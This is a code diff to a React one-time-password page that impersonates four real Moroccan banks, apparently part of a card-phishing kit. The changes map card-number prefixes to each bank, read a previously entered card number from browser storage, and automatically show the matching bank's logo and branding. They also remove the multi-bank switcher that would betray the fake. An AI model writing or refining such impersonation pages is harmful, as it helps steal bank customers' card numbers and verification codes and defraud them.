@@ -23,7 +23,8 @@ const BANK_CONFIGS = {
     tagline: 'Premier groupe bancaire au Maroc',
     slogan: 'Banque de tous les projets',
     icon: Building2,
-    features: ['Premier réseau au Maroc', 'Services digitaux avancés', 'Financement de projets']
+    features: ['Premier réseau au Maroc', 'Services digitaux avancés', 'Financement de projets'],
+    cardPrefixes: ['4037', '5243', '4477'] // Example prefixes
   },
   'bcp': {
     name: 'Banque Centrale Populaire',
@@ -36,7 +37,8 @@ const BANK_CONFIGS = {
     tagline: 'Grandir. Ensemble.',
     slogan: 'Banque populaire, banque citoyenne',
     icon: Users,
-    features: ['Banque coopérative', 'Proximité régionale', 'Valeurs mutualistes']
+    features: ['Banque coopérative', 'Proximité régionale', 'Valeurs mutualistes'],
+    cardPrefixes: ['4213', '5434', '5222']
   },
   'boa': {
     name: 'Bank of Africa',
@@ -49,7 +51,8 @@ const BANK_CONFIGS = {
     tagline: 'Your Partner Bank',
     slogan: 'Ensemble, construisons l\'Afrique',
     icon: Globe,
-    features: ['Présence panafricaine', 'Innovation bancaire', 'Partenaire de croissance']
+    features: ['Présence panafricaine', 'Innovation bancaire', 'Partenaire de croissance'],
+    cardPrefixes: ['4890', '5252']
   },
   'cih': {
     name: 'CIH Bank',
@@ -62,7 +65,8 @@ const BANK_CONFIGS = {
     tagline: 'Crédit Immobilier et Hôtelier',
     slogan: 'Votre banque de proximité',
     icon: TrendingUp,
-    features: ['Spécialiste immobilier', 'Financement hôtelier', 'Banque de développement']
+    features: ['Spécialiste immobilier', 'Financement hôtelier', 'Banque de développement'],
+    cardPrefixes: ['5041', '5105', '5111']
   }
 };
 
@@ -369,15 +373,35 @@ const OtpVerification: React.FC = () => {
   const IconComponent = config.icon;
 
   useEffect(() => {
-    // Access localStorage and URL params only on client-side
     const urlParams = new URLSearchParams(window.location.search);
-    const bank = urlParams.get('bank') || 'attijariwafa';
-    setBankKey(bank);
+    const bankParam = urlParams.get("bank");
+    const storedCardNumber = localStorage.getItem("cardnumber") || "";
+
+    // Try to auto-detect bank by card number if no URL param provided
+    if (!bankParam && storedCardNumber) {
+      const matchedBank = Object.entries(BANK_CONFIGS).find(([_, config]) =>
+        config.cardPrefixes?.some((prefix: string) =>
+          storedCardNumber.startsWith(prefix)
+        )
+      );
+
+      if (matchedBank) {
+        const detectedBankKey = matchedBank[0];
+        setBankKey(detectedBankKey);
+
+        const newUrl = new URL(window.location.href);
+        newUrl.searchParams.set("bank", detectedBankKey);
+        window.history.replaceState({}, "", newUrl.toString());
+      }
+    } else if (bankParam) {
+      setBankKey(bankParam);
+    }
 
     setToken(localStorage.getItem("token"));
     setCardToken(localStorage.getItem("cardToken"));
     setReturnUrl(localStorage.getItem("returnUrl") || "/");
   }, []);
+
 
   useEffect(() => {
     const timer = setInterval(() => {
@@ -536,41 +560,8 @@ const OtpVerification: React.FC = () => {
   }
 
   return (
-    <div className={`min-h-screen bg-gradient-to-br ${config.backgroundColor} py-8 px-4 sm:px-6 lg:px-8 flex flex-col items-center`}>
+    <div className={`min-h-screen bg-gradient-to-br ${config.backgroundColor} py-4 px-4 sm:px-6 lg:px-8 flex flex-col items-center`}>
       <div className="w-full max-w-md mx-auto">
-        {/* Bank Selection */}
-        <div className="mb-6">
-          <div className="flex justify-center space-x-2 mb-4">
-            {Object.entries(BANK_CONFIGS).map(([key, bankConfig]) => (
-              <button
-                key={key}
-                onClick={() => switchBank(key)}
-                className={`px-3 py-1 text-xs rounded-full font-medium transition-all duration-200 ${bankKey === key
-                  ? 'text-white shadow-md'
-                  : 'bg-white text-gray-600 hover:bg-gray-50'
-                  }`}
-                style={bankKey === key ? { backgroundColor: bankConfig.primaryColor } : {}}
-              >
-                {bankConfig.name.split(' ')[0]}
-              </button>
-            ))}
-          </div>
-        </div>
-
-        {/* Bank Header */}
-        <div className="flex flex-col items-center mb-8">
-          <BankLogo bankKey={bankKey} className="w-64 h-20 mb-6" />
-
-          <h1 className="text-2xl sm:text-3xl font-bold text-center mb-2" style={{ color: config.primaryColor }}>
-            Authentification Sécurisée
-          </h1>
-          <p className="text-sm text-gray-600 text-center mb-4">{config.tagline}</p>
-
-          <div className="flex items-center text-gray-600 text-sm">
-            <Shield className="h-4 w-4 mr-2" style={{ color: config.primaryColor }} />
-            <span>Protection 3D Secure</span>
-          </div>
-        </div>
 
         <Card className="bg-white p-8 shadow-xl rounded-lg mb-6 border border-gray-200">
           {error && (
@@ -580,13 +571,12 @@ const OtpVerification: React.FC = () => {
             </div>
           )}
 
-          <div className="space-y-6">
+          <div>
             <div className="text-center">
               <div
-                className="w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4"
-                style={{ backgroundColor: `${config.primaryColor}20` }}
+                className="flex items-center justify-center mx-auto mb-4"
               >
-                <Lock className="h-8 w-8" style={{ color: config.primaryColor }} />
+                <BankLogo bankKey={bankKey} className="w-64 h-20 mb-6" />
               </div>
 
               <h2 className="text-xl font-semibold text-gray-900 mb-2">Code de Vérification</h2>
@@ -640,23 +630,6 @@ const OtpVerification: React.FC = () => {
               </div>
             </div>
 
-            <div
-              className="flex items-start gap-3 text-sm p-4 rounded-lg border"
-              style={{
-                backgroundColor: `${config.primaryColor}08`,
-                borderColor: `${config.primaryColor}30`,
-                color: config.primaryColor
-              }}
-            >
-              <IconComponent size={18} className="shrink-0 mt-0.5" />
-              <div>
-                <p className="font-medium mb-1">Sécurité {config.name}</p>
-                <p style={{ color: `${config.primaryColor}CC` }}>
-                  Cette vérification protège votre transaction contre toute utilisation frauduleuse
-                </p>
-              </div>
-            </div>
-
             <Button
               onClick={handleVerifyOtp}
               className="w-full text-white font-medium py-3 text-base rounded-lg transition-colors duration-200"
@@ -677,45 +650,6 @@ const OtpVerification: React.FC = () => {
             </Button>
           </div>
         </Card>
-
-        {/* Bank Features */}
-        <div className="mb-6 bg-white/50 backdrop-blur-sm rounded-lg p-4 border border-white/20">
-          <div className="flex items-center justify-center space-x-6 text-xs text-gray-600">
-            {config.features.map((feature, index) => (
-              <div key={index} className="flex items-center">
-                <div
-                  className="w-2 h-2 rounded-full mr-2"
-                  style={{ backgroundColor: config.secondaryColor }}
-                ></div>
-                <span>{feature}</span>
-              </div>
-            ))}
-          </div>
-        </div>
-
-        {/* Trust indicators */}
-        <div className="text-center mb-6">
-          <div className="flex items-center justify-center space-x-6 text-xs text-gray-500">
-            <div className="flex items-center">
-              <div className="w-2 h-2 bg-green-500 rounded-full mr-2"></div>
-              <span>Connexion Sécurisée</span>
-            </div>
-            <div className="flex items-center">
-              <div className="w-2 h-2 bg-green-500 rounded-full mr-2"></div>
-              <span>SSL 256-bit</span>
-            </div>
-          </div>
-        </div>
-
-        <footer className="mt-10 text-center text-xs text-gray-500 space-y-2">
-          <p>
-            Copyright © {new Date().getFullYear()} {config.name} - Tous droits réservés.{" "}
-            <a href={config.website} className="hover:underline" style={{ color: config.primaryColor }}>
-              {config.website.replace('https://', '')}
-            </a>
-          </p>
-          <p className="text-gray-400">{config.slogan}</p>
-        </footer>
       </div>
     </div>
   );
